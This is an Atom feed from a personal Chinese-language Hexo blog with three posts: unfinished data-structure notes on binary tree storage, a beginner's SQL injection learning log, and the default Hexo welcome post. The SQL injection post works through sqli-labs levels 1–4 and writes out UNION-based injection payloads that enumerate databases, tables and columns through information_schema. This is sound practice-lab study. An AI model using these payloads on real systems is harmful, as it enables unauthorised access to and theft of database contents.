<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Enhenng的博客</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-11-19T00:33:03.451Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>enhenng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>数据结构与算法分析</title>
    <link href="http://example.com/2022/11/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%84%E7%AE%97%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2022/11/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%84%E7%AE%97%E5%88%86%E6%9E%90/</id>
    <published>2022-11-18T02:32:47.000Z</published>
    <updated>2022-11-19T00:33:03.451Z</updated>
    
    <content type="html"><![CDATA[<p>虽然我很不想学习算法相关的知识，但我相信这块应该是有用的，还是努力学一下吧，万一我很喜欢呢~~~~</p><h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><p>关于树以及二叉树的基本的定义不想写了，直接从二叉树的存储开始吧  </p><h2 id="二叉树的存储方式"><a href="#二叉树的存储方式" class="headerlink" title="二叉树的存储方式"></a>二叉树的存储方式</h2><p><strong>线性存储</strong><br>将二叉树赋予序号1,2,3…并将其按照顺序依次存储于数组之中—-&gt;这样会导致非完全二叉树的存储产生浪费——&gt;链式存储<br><strong>链式存储</strong><br>与线性表等完全类似<br>typedef struct Node{<br>     datatype data;<br>     struct Node *Ichild;<br>     struct Node *Rchild;<br>}Bigtree;<br>(当然，如果你愿意，大可以再加上一个parent指针，指向其双亲结点）</p><h2 id="二叉树的遍历和线索化"><a href="#二叉树的遍历和线索化" class="headerlink" title="二叉树的遍历和线索化"></a>二叉树的遍历和线索化</h2><p><strong>二叉树的遍历</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽然我很不想学习算法相关的知识，但我相信这块应该是有用的，还是努力学一下吧，万一我很喜欢呢~~~~&lt;/p&gt;
&lt;h1 id=&quot;树&quot;&gt;&lt;a href=&quot;#树&quot; class=&quot;headerlink&quot; title=&quot;树&quot;&gt;&lt;/a&gt;树&lt;/h1&gt;&lt;p&gt;关于树以及二叉树的基本的定义不想写</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>enhenng-first-blog----sql注入(持续更新）</title>
    <link href="http://example.com/2022/11/09/enhenng-first-blog-sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2022/11/09/enhenng-first-blog-sql%E6%B3%A8%E5%85%A5/</id>
    <published>2022-11-09T08:51:38.000Z</published>
    <updated>2022-11-13T10:18:43.973Z</updated>
    
    <content type="html"><![CDATA[<p>Hello，我是enhenng,在历经了长达三周的删删改改重建之后，我的blog终于搭建成功啦。</p><p>本文目标：学习sql注入，掌握基本的注入知识<br>基础知识：</p><h1 id="一：sql注入的基础知识："><a href="#一：sql注入的基础知识：" class="headerlink" title="一：sql注入的基础知识："></a>一：sql注入的基础知识：</h1><h2 id="sql的类型"><a href="#sql的类型" class="headerlink" title="sql的类型"></a>sql的类型</h2><ol><li>get型注入：直接在URL中进行sql注入（例如第一题）</li></ol><h2 id="需要使用要的一些函数"><a href="#需要使用要的一些函数" class="headerlink" title="需要使用要的一些函数"></a>需要使用要的一些函数</h2><h1 id="二：sqli-labs闯关"><a href="#二：sqli-labs闯关" class="headerlink" title="二：sqli-labs闯关"></a>二：sqli-labs闯关</h1><p><strong>第一关：基于错误的get型注入（字符型）</strong>（嗯…啥是基于错误？）<br>首先判断注入类型—–&gt;字符型or数字型<br>如何判断注入类型<a href="https://www.jianshu.com/p/5edd7a58a69e" title="参考文章">（参考文章）</a>  （这个很重要）<br>按照文章所示，尝试一下，发现在输入?id&#x3D;1’ and ‘1’&#x3D;’2’–+（这道题如果不加上–+，在回显时会出现报错）（想插一个图片来着，没找到合适的方法，算了）没有回显，是字符型注入。<br>尝试获取列数（在后面的union中需要保证前后队列书相同）</p><blockquote><p>?id&#x3D;1’ order by 3–+   —-&gt;回显正常<br>?id&#x3D;1’ order by 4–+   —-&gt;unkown column ‘4’ in ‘order clause’    </p></blockquote><p>即共有3列，下面才是重点<br>在获取敏感信息前要确定什么才是回显的内容  ?id&#x3D;-1’ union select 1,2,3(得到回显的内容）<br><strong>查询数据库信息</strong>  </p><blockquote><p>union select 1,database(),version<br>union select 1,1,SCHEMA_NAME from information_schema.SCHEMATA（暴露数据库名称）（在这之前需要了解一下数据库的结构）&#x2F;&#x2F;这个命令存在着一个问题<br>，只暴露所找的第一个表名称）<br>解决：union select 1,1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)–+<br>union select 1,1,TABLE_NAME（表名）,TABLE_SCHEMA（表所在数据库）from information_schema.TABLES（暴露数据库中表的名称）  &#x2F;&#x2F;这个命令存在着一个问题<br>，只暴露所找的第一个表名称）<br>union select 1,1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables *where table_schema&#x3D;’mysql’*)–+(MYSQL查询不区分大小写，但其库名表名等是严格区分大小写的）<br>union select 1,1,(select group_concat(column_name) from information_schema.columns where table_name &#x3D; “CHARACTER_SETS”)–+  </p></blockquote><p>这里的命令可以根据所想要查找的内容任意改变。  </p><p><strong>第二关（数字型）</strong><br>与第一关相同，首先判断sql注入的类型为数字型<br>按照第一关的步骤，依次获得数据库的名称，数据库中表的名称，列的名称等等  </p><p><strong>第三关</strong>（这一关与前两关的区别在于需要根据回显错误的内容猜测输入与原句的关系）<br>尝试猜测过程：  </p><ol><li>输入?id&#x3D;1 回显正常  </li><li>输入?id&#x3D;1’ 回显错误   You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1(即’’1’’)LIMIT 0,1’为url真正输入的)  </li><li>易看出应该是需要输入’)  </li><li>尝试输入?id&#x3D;1’)–+回显正常，则得出需要输入的东西</li></ol><p>但是这块还有一点我没能搞明白，为什么一定要按照?id&#x3D;1’) order by 1–+输入，而不能按照?id&#x3D;1’ order by 1)–+输入<br>之后，按照第一题依次得到即可以</p><p><strong>第四关</strong>(什么鬼，为什么我的第四关不报错）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Hello，我是enhenng,在历经了长达三周的删删改改重建之后，我的blog终于搭建成功啦。&lt;/p&gt;
&lt;p&gt;本文目标：学习sql注入，掌握基本的注入知识&lt;br&gt;基础知识：&lt;/p&gt;
&lt;h1 id=&quot;一：sql注入的基础知识：&quot;&gt;&lt;a href=&quot;#一：sql注入的基础知识</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2022/11/09/hello-world/"/>
    <id>http://example.com/2022/11/09/hello-world/</id>
    <published>2022-11-09T02:39:26.408Z</published>
    <updated>2022-11-09T02:39:26.408Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
